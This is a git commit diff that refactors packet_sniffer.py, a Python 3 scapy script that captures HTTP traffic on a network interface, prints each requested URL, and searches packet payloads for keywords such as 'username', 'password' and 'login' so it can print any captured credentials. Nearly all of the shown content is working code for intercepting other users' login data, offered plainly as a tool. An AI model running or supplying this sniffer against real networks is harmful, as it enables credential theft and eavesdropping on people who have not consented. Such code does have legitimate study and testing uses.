d6f1568c4c1b04b5e79b98e20be3268ccc4bbc6a
Vhackenstance <hackenstance@proton.me>
2026-04-24 09:31:18 -0500

    Refactor and update for Python3

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -7,14 +7,25 @@ keywords =["username", "password", "login", "email", "pass", "log", "UName", "UP
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
+def get_url(packet):
+    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+    return url
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load.decode("utf-8", errors='ignore')
+        for keyword in keywords:
+            if keyword in load:
+                return load
+    return None
+
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(url)
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            for keyword in keywords:
-                if keyword in load:
-                    print(load)
+        url = get_url(packet)
+        print(f"[+] HTTP Request >> {url.decode('utf-8')}")
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")
 
 sniff("eth0")
